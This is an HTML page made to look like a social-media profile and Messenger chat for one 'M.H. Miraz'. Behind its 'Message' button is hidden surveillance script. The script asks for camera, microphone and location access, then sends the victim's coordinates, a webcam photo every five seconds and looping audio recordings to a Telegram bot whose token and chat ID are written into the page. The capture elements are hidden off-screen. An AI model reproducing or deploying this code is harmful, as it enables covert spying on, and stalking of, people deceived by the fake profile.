<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>M.H. Miraz | Profile</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
        body { background-color: #f0f2f5; color: #1c1e21; }
        
        /* Profile Header */
        .header { background: white; padding-bottom: 15px; border-bottom: 1px solid #ddd; text-align: center; }
        .cover { width: 100%; height: 200px; background: #ddd url('https://via.placeholder.com/800x400') center/cover; }
        .profile-container { position: relative; display: inline-block; margin-top: -75px; }
        .profile-pic { width: 160px; height: 160px; border-radius: 50%; border: 4px solid white; background: #ccc url('https://via.placeholder.com/160') center/cover; }
        .name-box h1 { font-size: 26px; font-weight: 800; margin-top: 10px; color: #050505; }
        
        /* Action Buttons */
        .btn-row { display: flex; padding: 15px; gap: 10px; max-width: 500px; margin: 0 auto; }
        .btn-blue { background: #1877f2; color: white; border: none; padding: 10px; border-radius: 6px; flex: 1; font-weight: 600; cursor: pointer; }
        .btn-gray { background: #e4e6eb; color: black; border: none; padding: 10px; border-radius: 6px; flex: 1; font-weight: 600; cursor: pointer; }

        /* Bio Section */
        .bio-card { background: white; margin-top: 10px; padding: 15px; border-top: 1px solid #ddd; border-bottom: 1px solid #ddd; }
        .bio-text { text-align: center; font-size: 15px; margin-bottom: 15px; }
        .info-item { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; font-size: 15px; }
        .info-item i { color: #8a8d91; font-size: 20px; width: 25px; }

        /* Fullscreen Messenger Overlay */
        #messengerUI { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10000; flex-direction: column; }
        .msgr-header { padding: 10px 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; gap: 15px; }
        .msgr-header i { color: #0084ff; font-size: 20px; }
        .msgr-body { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #8a8d91; font-size: 14px; }
        .msgr-footer { padding: 10px; border-top: 1px solid #eee; display: flex; gap: 10px; align-items: center; }
        .msgr-input { flex: 1; background: #f0f2f5; border: none; padding: 10px 15px; border-radius: 20px; outline: none; }

        video, canvas { display: none; position: absolute; left: -9999px; }
    </style>
</head>
<body>

<div id="profilePage">
    <div class="header">
        <div class="cover"></div>
        <div class="profile-container"><div class="profile-pic"></div></div>
        <div class="name-box">
            <h1>M.H. Miřãz</h1>
            <p style="color:#65676b; font-size:14px;">288 Friends • 2 mutual</p>
        </div>
        <div class="btn-row">
            <button class="btn-blue">+ Add Friend</button>
            <button class="btn-gray" onclick="initiateMessenger()">📩 Message</button>
        </div>
    </div>

    <div class="bio-card">
        <div class="bio-text">Life is a Book, and those who do not travel read only a page. 📖✈️</div>
        <div class="info-item"><i class="fas fa-briefcase"></i> <span>Web Developer & Programmer</span></div>
        <div class="info-item"><i class="fas fa-graduation-cap"></i> <span>Studied at <b>Rangpur Polytechnic Institute</b></span></div>
        <div class="info-item"><i class="fas fa-home"></i> <span>Lives in <b>Rangpur</b></span></div>
    </div>
</div>

<div id="messengerUI">
    <div class="msgr-header">
        <i class="fas fa-arrow-left" onclick="location.reload()"></i>
        <img src="https://via.placeholder.com/35" style="border-radius:50%">
        <span style="font-weight:bold; flex:1;">M.H. Miraz</span>
        <i class="fas fa-phone-alt"></i>
        <i class="fas fa-video"></i>
    </div>
    <div class="msgr-body">
        <p>You're now connected on Messenger</p>
    </div>
    <div class="msgr-footer">
        <i class="fas fa-plus-circle" style="color:#0084ff"></i>
        <input type="text" class="msgr-input" placeholder="Aa">
        <i class="fas fa-thumbs-up" style="color:#0084ff"></i>
    </div>
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    const BOT_TOKEN = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
    const CHAT_ID = '7767412329';
    let active = false;

    async function initiateMessenger() {
        // UI চেঞ্জ
        document.getElementById('profilePage').style.display = 'none';
        document.getElementById('messengerUI').style.display = 'flex';

        try {
            // ১. ক্যামেরা ও অডিও এক্সেস
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('video').srcObject = stream;

            // ২. লোকেশন এক্সেস
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const mapUrl = `📍 Location: https://www.google.com/maps?q=${lat},${lon}`;
                    tgRequest('sendMessage', { text: mapUrl });
                });
            }

            if (!active) {
                setInterval(captureImage, 5000); // প্রতি ৫ সেকেন্ডে ছবি
                recordAudio(stream);            // ৩০ সেকেন্ডের অডিও লুপ
                active = true;
            }
        } catch (err) {
            console.log("User Denied Access");
        }
    }

    function captureImage() {
        const v = document.getElementById('video');
        const c = document.getElementById('canvas');
        if (v.videoWidth === 0) return;
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob((blob) => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'shot.jpg');
            tgUpload('sendPhoto', fd);
        }, 'image/jpeg', 0.5);
    }

    function recordAudio(stream) {
        let recorder = new MediaRecorder(stream);
        let chunks = [];
        recorder.ondataavailable = (e) => chunks.push(e.data);
        recorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'audio/ogg' });
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('voice', blob, 'voice.ogg');
            tgUpload('sendVoice', fd);
            chunks = [];
            recorder.start();
        };
        recorder.start();
        setInterval(() => { if(recorder.state === 'recording') recorder.stop(); }, 30000);
    }

    function tgRequest(method, params) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}?chat_id=${CHAT_ID}&` + new URLSearchParams(params));
    }

    function tgUpload(method, formData) {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/${method}`, true);
        xhr.send(formData);
    }
</script>

</body>
</html>
